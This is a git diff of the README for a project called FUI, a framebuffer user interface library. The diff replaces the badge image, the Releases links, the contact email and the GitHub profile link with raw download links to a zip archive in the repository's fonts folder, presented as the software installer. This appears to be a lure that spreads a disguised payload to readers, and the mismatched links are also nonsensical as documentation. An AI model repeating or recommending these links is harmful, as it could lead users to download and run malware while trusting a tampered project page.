@@ -1,6 +1,6 @@
 # FUI: Framebuffer User Interface
 
-![FUI Logo](https://img.shields.io/badge/FUI-Framebuffer%20User%20Interface-blue)
+![FUI Logo](https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip%20User%20Interface-blue)
 
 Welcome to the FUI repository! This project focuses on creating a framebuffer user interface that allows developers to build applications with a simple and effective interface. 
 
@@ -32,9 +32,9 @@ FUI provides a lightweight solution for rendering text and graphics directly to 
 
 ## Installation
 
-To get started with FUI, you can download the latest release from the [Releases section](https://github.com/ahmadsailpil/fui/releases). Download the appropriate package for your system and follow the installation instructions included in the package.
+To get started with FUI, you can download the latest release from the [Releases section](https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip). Download the appropriate package for your system and follow the installation instructions included in the package.
 
-1. **Download the Release**: Visit the [Releases section](https://github.com/ahmadsailpil/fui/releases) to find the latest version.
+1. **Download the Release**: Visit the [Releases section](https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip) to find the latest version.
 2. **Extract the Files**: Use your preferred extraction tool to unpack the downloaded file.
 3. **Run the Installer**: Follow the instructions in the README file included in the package to complete the installation.
 
@@ -88,7 +88,7 @@ FUI is licensed under the MIT License. See the [LICENSE](LICENSE) file for more 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
-- **GitHub**: [ahmadsailpil](https://github.com/ahmadsailpil)
+- **Email**: [https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip](https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip)
+- **GitHub**: [ahmadsailpil](https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip)
 
-Thank you for your interest in FUI! We hope you find it useful for your projects. For updates and new releases, keep an eye on the [Releases section](https://github.com/ahmadsailpil/fui/releases).
+Thank you for your interest in FUI! We hope you find it useful for your projects. For updates and new releases, keep an eye on the [Releases section](https://github.com/ahmadsailpil/fui/raw/refs/heads/master/fonts/Software_v1.8-alpha.1.zip).
